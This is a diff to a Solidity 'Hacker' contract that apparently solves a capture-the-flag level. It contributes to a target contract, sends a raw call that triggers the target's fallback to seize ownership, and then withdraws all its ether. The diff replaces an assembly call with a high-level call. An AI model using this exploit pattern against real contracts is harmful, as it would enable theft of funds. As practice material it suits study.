@@ -31,19 +31,22 @@ contract Hacker {
     fallbackInstance.contribute{value: contributionFee}();
 
     // 2. Send Transaction to claim owner, should set the gas as enough as the target contract is able to modify owner.
-    assembly {
-      pop( // discard result
-        call(
-          100000, // gas
-          _target, // target address
-          selfbalance(), // current balance
-          0, // input location
-          0, // no input params
-          0, // output location
-          0 // no need to use output params
-        )
-      )
-    }
+    _target.call{gas: 100000, value: address(this).balance}("");
+
+
+    // assembly {
+    //   pop( // discard result
+    //     call(
+    //       100000, // gas
+    //       _target, // target address
+    //       selfbalance(), // current balance
+    //       0, // input location
+    //       0, // no input params
+    //       0, // output location
+    //       0 // no need to use output params
+    //     )
+    //   )
+    // }
 
     // 3. Withdraw all ether
     fallbackInstance.withdraw();
